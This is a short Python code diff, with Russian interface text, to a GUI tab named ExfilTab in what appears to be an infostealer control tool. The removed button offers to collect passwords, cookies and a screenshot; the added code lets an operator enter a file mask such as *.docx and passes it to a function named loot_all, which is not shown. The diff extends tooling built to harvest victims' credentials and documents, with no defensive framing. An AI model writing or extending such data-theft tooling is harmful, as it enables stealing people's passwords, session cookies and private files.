@@ -8,8 +8,12 @@ class ExfilTab(tk.Frame):
         self.build_ui()
 
     def build_ui(self):
-        tk.Button(self, text="Запустить сбор данных (пароли/куки/скриншот)", command=self.start_exfil).pack(pady=20)
+        tk.Label(self, text="Маска файлов (например *.docx):").pack(anchor=tk.W, padx=5, pady=5)
+        self.mask_entry = tk.Entry(self, width=30)
+        self.mask_entry.pack(padx=5)
+        tk.Button(self, text="Запустить сбор данных", command=self.start_exfil).pack(pady=20)
 
     def start_exfil(self):
-        loot_all()
-        messagebox.showinfo("Exfil", "Сбор данных завершён")
+        mask = self.mask_entry.get()
+        loot_all(mask=mask)
+        messagebox.showinfo("Exfil", f"Сбор данных завершён (маска: {mask})")
